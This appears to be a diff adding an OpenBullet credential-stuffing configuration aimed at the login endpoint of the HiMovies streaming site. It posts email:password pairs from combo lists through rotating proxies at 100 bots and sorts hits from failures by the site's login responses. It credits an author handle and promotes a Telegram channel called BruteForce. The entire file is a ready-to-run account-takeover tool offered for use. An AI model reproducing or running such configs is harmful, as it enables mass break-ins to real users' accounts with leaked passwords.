@@ -1,0 +1,63 @@
+[SETTINGS]
+{
+  "Name": "HimMovies",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-09-14T01:51:22.842668+04:30",
+  "AdditionalInfo": "Telegram Channel: T.me/BruteForce | No Capture ",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www2.himovies.to/ajax/login" 
+  CONTENT "email=<USER>&password=<PASS>&remember=false" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER ": scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,fa;q=0.8" 
+  HEADER "cache-control: no-cache" 
+  HEADER "content-length: 72" 
+  HEADER "origin: https://www2.himovies.to" 
+  HEADER "pragma: no-cache" 
+  HEADER "referer: https://www2.himovies.to/" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Email or password is invalid." 
+  KEYCHAIN Success OR 
+    KEY "\"status\":true," 
+
+FUNCTION Constant " T.me/BruteForce " -> CAP "Telegram Channel:" 
+
